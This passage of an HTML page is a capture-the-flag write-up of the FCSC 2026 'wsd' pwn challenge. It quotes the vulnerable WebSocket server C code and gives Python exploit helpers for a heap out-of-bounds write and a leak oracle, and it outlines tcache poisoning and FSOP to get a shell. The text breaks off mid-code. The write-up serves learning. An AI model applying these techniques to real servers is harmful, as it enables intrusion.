@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>0xb0tm4n&#x27;s website</title>
+  <script src="/js/index.js" defer></script>
+  <script src="/js/prompt.js" defer></script>
+  <script src="/js/keyboard.js" defer></script>
+  <script src="/js/tab.js" defer></script>
+  <script src="/js/commands.js" defer></script>
+  <script src="/js/config.js" defer></script><link rel="stylesheet" href="/css/base.css"><link rel="stylesheet" href="/css/page.css"></head>
+
+<body onkeydown="exec(event)">
+    <main>
+      <div class="files" id="files" tabindex="0">
+<ul><li class="file">
+    <span>├── <a href="https://super-botman.github.io/readme/" tabindex="-2">README</a></span>
+    </li><li class="folder">
+    <span>├── <a href="https://super-botman.github.io/web/" tabindex="-3">Web</a></span>
+    <ul><li class="folder">
+    <span>│   └── <a href="https://super-botman.github.io/web/writeups/" tabindex="-4">Writeups</a></span>
+    <ul><li class="file">
+    <span>│       ├── <a href="https://super-botman.github.io/web/writeups/thomghost/" tabindex="-5">THM | Thomghost</a></span>
+    </li><li class="file">
+    <span>│       └── <a href="https://super-botman.github.io/web/writeups/boiler/" tabindex="-6">THM | Boiler</a></span>
+    </li>
+      </ul>
+    </li>
+      </ul>
+    </li><li class="folder">
+    <span>└── <a href="https://super-botman.github.io/pwn/" tabindex="-7">Pwn</a></span>
+    <ul><li class="folder">
+    <span>    └── <a href="https://super-botman.github.io/pwn/writeups/" tabindex="-8">Writeups</a></span>
+    <ul><li class="file">
+    <span>        ├── <a href="https://super-botman.github.io/pwn/writeups/pwn103/" tabindex="-9">THM | pwn101 task 103</a></span>
+    </li><li class="file">
+    <span>        ├── <a href="https://super-botman.github.io/pwn/writeups/aarchibald/" tabindex="-10">Hackropole | Aarchibald</a></span>
+    </li><li class="file">
+    <span>        ├── <a class="selected" href="https://super-botman.github.io/pwn/writeups/wsd/" tabindex="-11">FCSC 2026 | wsd</a></span>
+    </li><li class="file">
+    <span>        ├── <a href="https://super-botman.github.io/pwn/writeups/bigorneau/" tabindex="-12">FCSC 2025 | Bigorneau</a></span>
+    </li><li class="file">
+    <span>        ├── <a href="https://super-botman.github.io/pwn/writeups/alfred/" tabindex="-13">Hackropole | Alfred</a></span>
+    </li><li class="file">
+    <span>        ├── <a href="https://super-botman.github.io/pwn/writeups/robot/" tabindex="-14">FCSC 2023 | Robot</a></span>
+    </li><li class="file">
+    <span>        ├── <a href="https://super-botman.github.io/pwn/writeups/autodiag/" tabindex="-15">FCSC 2026 | Autodiag</a></span>
+    </li><li class="file">
+    <span>        ├── <a href="https://super-botman.github.io/pwn/writeups/armigo/" tabindex="-16">Hackropole | Armigo</a></span>
+    </li><li class="file">
+    <span>        ├── <a href="https://super-botman.github.io/pwn/writeups/small-prime-shellcode/" tabindex="-17">FCSC 2025 | Small Prime Shellcode</a></span>
+    </li><li class="file">
+    <span>        └── <a href="https://super-botman.github.io/pwn/writeups/http3/" tabindex="-18">FCSC 2025 | HTTP3</a></span>
+    </li>
+      </ul>
+    </li>
+      </ul>
+    </li>
+</ul>
+</div>
+      <div class="viewer page" id="viewer" tabindex="0">
+        <div class="tab">
+<div class="file-manager" onclick='document.getElementById("files").classList.toggle("open"); document.getElementById("content").classList.toggle("close")'> </div>
+<ul id="tabs">
+</ul>
+
+
+</div>
+        <div class="content" id="content"><h1 id="pwn-wsd-fcsc-2026">[Pwn] wsd | FCSC 2026</h1>
+<ul>
+<li>Level: ⭐⭐</li>
+<li>Solves: 8</li>
+<li>Description:
+<blockquote>
+<p>Vous avez adoré la trilogie HTTP, je vous présente alors wsd, c'est presque pareil, mais différent.
+Récupérez le flag dans /app/flag.txt.</p>
+</blockquote>
+</li>
+<li>Exploit: <a rel="external" href="https://transfer.0xb0tm4n.org/inline/uUkj8KnxAY/exploit.py">exploit.py</a></li>
+</ul>
+<hr />
+<ul>
+<li><a href="https://super-botman.github.io/pwn/writeups/wsd/#TLDR">1. TL;DR</a></li>
+<li><a href="https://super-botman.github.io/pwn/writeups/wsd/#full-explanation">2. Full explanation</a>
+<ul>
+<li><a href="https://super-botman.github.io/pwn/writeups/wsd/#the-bug">2.1 The bug</a></li>
+<li><a href="https://super-botman.github.io/pwn/writeups/wsd/#OOB">2.2 OOB</a></li>
+<li><a href="https://super-botman.github.io/pwn/writeups/wsd/#first-leak">2.3 First leak</a></li>
+<li><a href="https://super-botman.github.io/pwn/writeups/wsd/#second-leak">2.4 Second leak</a></li>
+<li><a href="https://super-botman.github.io/pwn/writeups/wsd/#RCE">2.5 RCE</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="tldr">TLDR</h2>
+<ul>
+<li>leak the heap and the libc</li>
+<li>tcache poisoning to get arb write primitive</li>
+<li>FSOP to gain a one-way shell and then cat the flag</li>
+</ul>
+<h2 id="full-explanation">Full explanation</h2>
+<h3 id="the-bug">The bug</h3>
+<p>The bug was well hidden and I ended up finding it by pure luck. The issue was that the function which allocate the session <code>ws_session_create</code> doesn't clear the malloc'ed chunk (an easy fix would have been to use calloc but we're not here to fix but to exploit that hehe):</p>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="c"><span class="giallo-l"><span style="color: #51597D;font-style: italic;">/* WebSocket session */</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">struct</span><span> ws_session </span><span style="color: #9ABDF5;">{</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">	enum</span><span style="color: #9ABDF5;"> ws_state     state</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">	/* Fragmentation state */</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">	enum</span><span style="color: #9ABDF5;"> ws_opcode    frag_opcode</span><span style="color: #89DDFF;">;</span><span style="color: #51597D;font-style: italic;"> /* the opcode of the initial fragment */</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">	size_t</span><span style="color: #9ABDF5;">            frag_len</span><span style="color: #89DDFF;">;</span><span style="color: #51597D;font-style: italic;">    /* current length of the fragmented message */</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">	uint8_t</span><span style="color: #89DDFF;">          *</span><span style="color: #9ABDF5;">frag_buf</span><span style="color: #89DDFF;">;</span><span style="color: #51597D;font-style: italic;">    /* accumulated payload for fragments */</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">}</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">struct</span><span> ws_session </span><span style="color: #89DDFF;">*</span><span style="color: #7AA2F7;">ws_session_create</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">struct</span><span> ws_client </span><span style="color: #89DDFF;">*</span><span style="color: #E0AF68;">client</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">{</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">	struct</span><span style="color: #9ABDF5;"> ws_session </span><span style="color: #89DDFF;">*</span><span style="color: #9ABDF5;">s</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">	s </span><span style="color: #89DDFF;">=</span><span style="color: #7AA2F7;"> malloc</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">sizeof</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">*</span><span style="color: #7AA2F7;">s</span><span style="color: #9ABDF5;">))</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">	if</span><span style="color: #9ABDF5;"> (</span><span style="color: #BB9AF7;">!</span><span style="color: #9ABDF5;">s)</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">		return</span><span style="color: #FF9E64;"> NULL</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #C0CAF5;">	s</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">state</span><span style="color: #89DDFF;">  =</span><span style="color: #9ABDF5;"> WS_STATE_OPEN</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">	return</span><span style="color: #9ABDF5;"> s</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">}</span></span></code></pre>
+<p>The len of <code>ws_session</code> is 0x30 so we just have to allocate and then free a previous chunk of size 0x30 to control the struct. The only problem here is that we cannot put any value we want as all the previous controlled chunks that are being freed are populated by <code>strdup</code>, so this meant that the only valid values we could put into the struct were a negative len and a possible ptr.</p>
+<h3 id="oob">OOB</h3>
+<p>So using the fact that we can set frag_len to be a negative value we could exploit this code</p>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="c"><span class="giallo-l"><span style="color: #9D7CD8;font-style: italic;">static</span><span style="color: #BB9AF7;"> int</span><span style="color: #7AA2F7;"> ws_handle_frame</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">struct</span><span> ws_client </span><span style="color: #89DDFF;">*</span><span style="color: #E0AF68;">client</span><span style="color: #89DDFF;">,</span><span style="color: #BB9AF7;"> struct</span><span> ws_frame </span><span style="color: #89DDFF;">*</span><span style="color: #E0AF68;">frame</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">{</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  struct</span><span style="color: #9ABDF5;"> ws_session </span><span style="color: #89DDFF;">*</span><span style="color: #9ABDF5;">session </span><span style="color: #89DDFF;">=</span><span style="color: #C0CAF5;"> client</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">session</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  int</span><span style="color: #9ABDF5;"> fd </span><span style="color: #89DDFF;">=</span><span style="color: #C0CAF5;"> client</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">fd</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">  [...]</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  if</span><span style="color: #9ABDF5;"> (</span><span style="color: #C0CAF5;">frame</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">opcode</span><span style="color: #BB9AF7;"> ==</span><span style="color: #9ABDF5;"> WS_OP_TEXT </span><span style="color: #BB9AF7;">||</span><span style="color: #C0CAF5;"> frame</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">opcode</span><span style="color: #BB9AF7;"> ==</span><span style="color: #9ABDF5;"> WS_OP_BINARY) {</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">    [...]</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">  }</span><span style="color: #BB9AF7;"> else if</span><span style="color: #9ABDF5;"> (</span><span style="color: #C0CAF5;">frame</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">opcode</span><span style="color: #BB9AF7;"> ==</span><span style="color: #9ABDF5;"> WS_OP_CONTINUATION) {</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">    // Append payload to the fragmentation buffer</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">    // this is checking that payload_len is not negative but doesn&#39;t check frag_len value</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">    if</span><span style="color: #9ABDF5;"> (</span><span style="color: #C0CAF5;">frame</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">payload_len</span><span style="color: #BB9AF7;"> &gt;</span><span style="color: #FF9E64;"> 0</span><span style="color: #9ABDF5;">) {</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">        // so if we set a negative frag_len using the bug</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">        // frag_len will be equal to payload_len - frag_len</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        size_t</span><span style="color: #9ABDF5;"> new_len </span><span style="color: #89DDFF;">=</span><span style="color: #C0CAF5;"> session</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">frag_len</span><span style="color: #89DDFF;"> +</span><span style="color: #C0CAF5;"> frame</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">payload_len</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        if</span><span style="color: #9ABDF5;"> (new_len </span><span style="color: #BB9AF7;">&gt;</span><span style="color: #9ABDF5;"> WSD_MAX_FRAME_SIZE) {</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">        LOG_ERR</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">Fragmented message exceeds max size</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">        ws_send_close</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">client</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> WS_CLOSE_TOO_BIG</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        return</span><span style="color: #89DDFF;"> -</span><span style="color: #FF9E64;">1</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">        }</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">        // now we can fully control the realloc</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        uint8_t</span><span style="color: #89DDFF;"> *</span><span style="color: #9ABDF5;">tmp </span><span style="color: #89DDFF;">=</span><span style="color: #7AA2F7;"> realloc</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">session</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">frag_buf</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> new_len</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        if</span><span style="color: #9ABDF5;"> (</span><span style="color: #BB9AF7;">!</span><span style="color: #9ABDF5;">tmp) {</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">        LOG_ERR</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">Failed to reallocate fragmentation buffer</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">        ws_send_close</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">client</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> WS_CLOSE_ABNORMAL</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        return</span><span style="color: #89DDFF;"> -</span><span style="color: #FF9E64;">1</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">        }</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">        // but more importantly we can use it to OOB write</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">        // here using a negative value for frag_len will allow us to write to</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">        // any session - idx we want (almost), so we can fully control the</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">        // heap chunk&#39;s metdata</span></span>
+<span class="giallo-l"><span style="color: #C0CAF5;">        session</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">frag_buf</span><span style="color: #89DDFF;"> =</span><span style="color: #9ABDF5;"> tmp</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">        memcpy</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">session</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">frag_buf</span><span style="color: #89DDFF;"> +</span><span style="color: #C0CAF5;"> session</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">frag_len</span><span style="color: #89DDFF;">,</span><span style="color: #C0CAF5;"> frame</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">payload</span><span style="color: #89DDFF;">,</span><span style="color: #C0CAF5;"> frame</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">payload_len</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #C0CAF5;">        session</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">frag_len</span><span style="color: #89DDFF;"> =</span><span style="color: #9ABDF5;"> new_len</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">    }</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">    [...]</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">}</span></span></code></pre><h3 id="first-leak">First leak</h3>
+<p>So the first step to this exploit was to gain a heap leak, I could have done that using smart heap tricks but as I'm dumb I used the <del>fastest</del>easiest path that is BRUTEFORCING THE WHOLE <code>frag_buf</code> ADDRESS USING AN ORACLE.</p>
+<p>To do this the first thing I had to find was a good oracle that would let me test every bytes one by one. I went for this simple, yet effective, approach:</p>
+<ul>
+<li>overwrite one byte of the <code>frag_buf</code> by our test value using this code:</li>
+</ul>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="python"><span class="giallo-l"><span style="color: #BB9AF7;">def</span><span style="color: #7AA2F7;"> set_offset</span><span style="color: #9ABDF5;">(</span><span style="color: #E0AF68;">idx</span><span style="color: #9ABDF5;">):</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">    # allocate the chunk of size 0x30 that will be reused by `ws_session_create`</span></span>
+<span class="giallo-l"><span>    payload</span><span style="color: #89DDFF;"> =</span><span style="color: #BB9AF7;"> b</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">%s %s HTTP1.1</span><span style="color: #89DDFF;">\r\n&quot; % (</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&quot;\xff&quot; *</span><span style="color: #BB9AF7;"> 0x</span><span style="color: #FF9E64;">10</span><span style="color: #89DDFF;"> +</span><span style="color: #7AA2F7;"> p64</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">idx</span><span style="color: #BB9AF7;"> &amp;</span><span style="color: #89DDFF;"> ((</span><span style="color: #FF9E64;">1</span><span style="color: #BB9AF7;"> &lt;&lt;</span><span style="color: #FF9E64;"> 64</span><span style="color: #89DDFF;">) -</span><span style="color: #FF9E64;"> 1</span><span style="color: #89DDFF;">)</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">,</span><span style="color: #BB9AF7;"> b</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">/</span><span style="color: #89DDFF;">&quot;)</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    send</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">payload</span><span style="color: #89DDFF;"> +</span><span style="color: #BB9AF7;"> b</span><span style="color: #89DDFF;">&quot;\r\n&quot;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    rln</span><span style="color: #9ABDF5;">(</span><span style="color: #FF9E64;">2</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">def</span><span style="color: #7AA2F7;"> ws_upgrade</span><span style="color: #9ABDF5;">(</span><span style="color: #E0AF68;">extra_headers</span><span style="color: #89DDFF;">=&quot;&quot;</span><span style="color: #9ABDF5;">):</span></span>
+<span class="giallo-l"><span>    payload</span><span style="color: #89DDFF;">  = &quot;</span><span style="color: #9ECE6A;">GET / HTTP1.1</span><span style="color: #89DDFF;">\r\n&quot;</span></span>
+<span class="giallo-l"><span>    payload</span><span style="color: #89DDFF;"> += &quot;</span><span style="color: #9ECE6A;">Upgrade: Websocket</span><span style="color: #89DDFF;">\r\n&quot;</span></span>
+<span class="giallo-l"><span>    payload</span><span style="color: #89DDFF;"> += &quot;</span><span style="color: #9ECE6A;">Sec-WebSocket-Key: BBBB</span><span style="color: #89DDFF;">\r\n&quot;</span></span>
+<span class="giallo-l"><span>    payload</span><span style="color: #89DDFF;"> += &quot;</span><span style="color: #9ECE6A;">Sec-WebSocket-Version: 13</span><span style="color: #89DDFF;">\r\n&quot;</span></span>
+<span class="giallo-l"><span>    payload</span><span style="color: #89DDFF;"> +=</span><span> extra_headers</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    send</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">payload</span><span style="color: #89DDFF;"> + &quot;\r\n&quot;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    rln</span><span style="color: #9ABDF5;">(</span><span style="color: #FF9E64;">5</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">def</span><span style="color: #7AA2F7;"> arb_write</span><span style="color: #9ABDF5;">(</span><span style="color: #E0AF68;">idx</span><span style="color: #89DDFF;">,</span><span style="color: #E0AF68;"> data</span><span style="color: #9ABDF5;">):</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    set_offset</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">idx</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    ws_upgrade</span><span style="color: #9ABDF5;">()</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">    # this will write at idx and allocate a chunk of size 0x20 as</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">    # new_len = payload_len - idx</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">    # so here, new_len = 10 and the min chunk size is 0x20</span></span>
+<span class="giallo-l"><span>    session</span><span style="color: #89DDFF;"> =</span><span style="color: #7AA2F7;"> flat</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">{</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        0x</span><span style="color: #FF9E64;">0</span><span style="color: #89DDFF;">:</span><span style="color: #C0CAF5;"> data</span><span style="color: #89DDFF;">,</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">        -</span><span style="color: #C0CAF5;">idx</span><span style="color: #89DDFF;"> +</span><span style="color: #FF9E64;"> 10</span><span style="color: #89DDFF;">:</span><span style="color: #BB9AF7;"> b</span><span style="color: #89DDFF;">&quot;\x00&quot;,</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">    },</span><span style="color: #E0AF68;"> filler</span><span style="color: #89DDFF;">=</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&quot;\x00&quot;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    ws_send</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">Op</span><span style="color: #89DDFF;">.</span><span style="color: #FF9E64;">CONTINUATION</span><span style="color: #89DDFF;">,</span><span style="color: #C0CAF5;"> session</span><span style="color: #89DDFF;">,</span><span style="color: #E0AF68;"> fin</span><span style="color: #89DDFF;">=</span><span style="color: #FF9E64;">False</span><span style="color: #9ABDF5;">)</span></span></code></pre>
+<p>then we could exploit the other part of <code>OP_CONTINUATION</code> code:</p>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="c"><span class="giallo-l"><span style="color: #9D7CD8;font-style: italic;">static</span><span style="color: #BB9AF7;"> int</span><span style="color: #7AA2F7;"> ws_handle_frame</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">struct</span><span> ws_client </span><span style="color: #89DDFF;">*</span><span style="color: #E0AF68;">client</span><span style="color: #89DDFF;">,</span><span style="color: #BB9AF7;"> struct</span><span> ws_frame </span><span style="color: #89DDFF;">*</span><span style="color: #E0AF68;">frame</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">{</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  struct</span><span style="color: #9ABDF5;"> ws_session </span><span style="color: #89DDFF;">*</span><span style="color: #9ABDF5;">session </span><span style="color: #89DDFF;">=</span><span style="color: #C0CAF5;"> client</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">session</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  int</span><span style="color: #9ABDF5;"> fd </span><span style="color: #89DDFF;">=</span><span style="color: #C0CAF5;"> client</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">fd</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">  [...]</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  if</span><span style="color: #9ABDF5;"> (</span><span style="color: #C0CAF5;">frame</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">opcode</span><span style="color: #BB9AF7;"> ==</span><span style="color: #9ABDF5;"> WS_OP_TEXT </span><span style="color: #BB9AF7;">||</span><span style="color: #C0CAF5;"> frame</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">opcode</span><span style="color: #BB9AF7;"> ==</span><span style="color: #9ABDF5;"> WS_OP_BINARY) {</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">    [...]</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">  }</span><span style="color: #BB9AF7;"> else if</span><span style="color: #9ABDF5;"> (</span><span style="color: #C0CAF5;">frame</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">opcode</span><span style="color: #BB9AF7;"> ==</span><span style="color: #9ABDF5;"> WS_OP_CONTINUATION) {</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">    [...]</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  	if</span><span style="color: #9ABDF5;"> (</span><span style="color: #C0CAF5;">frame</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">fin</span><span style="color: #9ABDF5;">) {</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">			// End of fragmented message, echo back the fully assembled buffer</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">			// TODO: Implement actually useful logic here</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">			LOG_DBG</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">Echo fragmented frame (</span><span style="color: #C0CAF5;">%zu</span><span style="color: #9ECE6A;"> bytes assembled, fd=</span><span style="color: #C0CAF5;">%d</span><span style="color: #9ECE6A;">)</span><span style="color: #89DDFF;">&quot;,</span></span>
+<span class="giallo-l"><span style="color: #C0CAF5;">				session</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">frag_len</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> fd</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">			int</span><span style="color: #9ABDF5;"> ret </span><span style="color: #89DDFF;">=</span><span style="color: #7AA2F7;"> ws_send_frame</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">client</span><span style="color: #89DDFF;">,</span><span style="color: #C0CAF5;"> session</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">frag_opcode</span><span style="color: #89DDFF;">,</span></span>
+<span class="giallo-l"><span style="color: #C0CAF5;">						session</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">frag_buf</span><span style="color: #89DDFF;">,</span><span style="color: #C0CAF5;"> session</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">frag_len</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">			// Clean up fragmentation state</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">			free</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">session</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">frag_buf</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #C0CAF5;">			session</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">frag_buf</span><span style="color: #89DDFF;"> =</span><span style="color: #FF9E64;"> NULL</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #C0CAF5;">			session</span><span style="color: #89DDFF;">-&gt;</span><span style="color: #C0CAF5;">frag_len</span><span style="color: #89DDFF;"> =</span><span style="color: #FF9E64;"> 0</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
